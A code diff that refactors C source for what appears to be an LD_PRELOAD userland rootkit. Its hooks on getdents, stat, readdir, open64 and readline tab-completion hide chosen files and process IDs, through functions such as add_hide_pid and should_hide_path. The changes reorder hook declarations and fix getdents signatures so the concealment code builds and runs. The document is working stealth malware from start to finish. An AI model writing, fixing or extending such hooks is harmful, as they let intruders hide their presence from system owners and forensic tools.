@@ -47,20 +47,10 @@ static void add_hide_pid(pid_t pid) {
     add_hide_name(buf);
 }
 
-// Stat, getdents and readline hooks for tab complete and others
-static int (*orig_stat)(const char *, struct stat *) = NULL;
-static int (*orig_lstat)(const char *, struct stat *) = NULL;
-static int (*orig_fstat)(int, struct stat *) = NULL;
-static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
-static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
-static int (*orig_fstat64)(int, struct stat64 *) = NULL;
-static struct dirent *(*orig_readdir)(DIR *) = NULL;
-static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
+// ====== READLINE HOOKS ======
 static char *(*orig_readline)(const char *) = NULL;
 static char **(*orig_rl_completion_matches)(const char *, rl_compentry_func_t *) = NULL;
 static char *(*orig_rl_filename_completion_function)(const char *, int) = NULL;
-static long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int) = NULL;
-static long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int) = NULL;
 
 // Custom completion generator that filters hidden files
 static char *custom_filename_completion_function(const char *text, int state) {
@@ -311,7 +301,7 @@ static int libhide(const char *name) {
     return 0;
 }
 
-// Define the kernel dirent structures manually
+// FIXED: Move kernel dirent structures to global scope
 struct linux_dirent {
     unsigned long  d_ino;
     unsigned long  d_off;
@@ -327,8 +317,14 @@ struct linux_dirent64 {
     char           d_name[];
 };
 
+typedef long (*getdents_func_t)(unsigned int, void *, unsigned int);
+typedef long (*getdents64_func_t)(unsigned int, void *, unsigned int);
+
+static getdents_func_t orig_getdents = NULL;
+static getdents64_func_t orig_getdents64 = NULL;
+
 // Wrapper for getdents syscall
-long getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+long getdents_syscall(unsigned int fd, void *dirp, unsigned int count) {
     if (!orig_getdents) {
         *(void **)&orig_getdents = dlsym(RTLD_NEXT, "getdents");
         if (!orig_getdents) return -ENOSYS;
@@ -360,7 +356,7 @@ long getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int c
 }
 
 // Wrapper for getdents64 syscall
-long getdents64_syscall(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+long getdents64_syscall(unsigned int fd, void *dirp, unsigned int count) {
     if (!orig_getdents64) {
         *(void **)&orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
         if (!orig_getdents64) return -ENOSYS;
@@ -393,11 +389,11 @@ long getdents64_syscall(unsigned int fd, struct linux_dirent64 *dirp, unsigned i
 
 // Override the actual syscalls with correct signatures
 ssize_t getdents(int fd, void *dirp, size_t count) {
-    return getdents_syscall(fd, (struct linux_dirent *)dirp, count);
+    return getdents_syscall(fd, dirp, count);
 }
 
 ssize_t getdents64(int fd, void *dirp, size_t count) {
-    return getdents64_syscall(fd, (struct linux_dirent64 *)dirp, count);
+    return getdents64_syscall(fd, dirp, count);
 }
 
 // Enhanced should_hide_path function
@@ -510,6 +506,14 @@ int open64(const char *path, int flags, ...) {
     return orig_open64(path, flags, mode);
 }
 
+// Stat hooks for tab complete and others
+static int (*orig_stat)(const char *, struct stat *) = NULL;
+static int (*orig_lstat)(const char *, struct stat *) = NULL;
+static int (*orig_fstat)(int, struct stat *) = NULL;
+static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
+static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
+static int (*orig_fstat64)(int, struct stat64 *) = NULL;
+
 int stat(const char *path, struct stat *buf) {
     if (!orig_stat) {
         *(void **)&orig_stat = dlsym(RTLD_NEXT, "stat");
@@ -575,6 +579,10 @@ int fstat64(int fd, struct stat64 *buf) {
     }
     return orig_fstat64(fd, buf);
 }
+
+// Readdir hooks 
+static struct dirent *(*orig_readdir)(DIR *) = NULL;
+static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
 
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
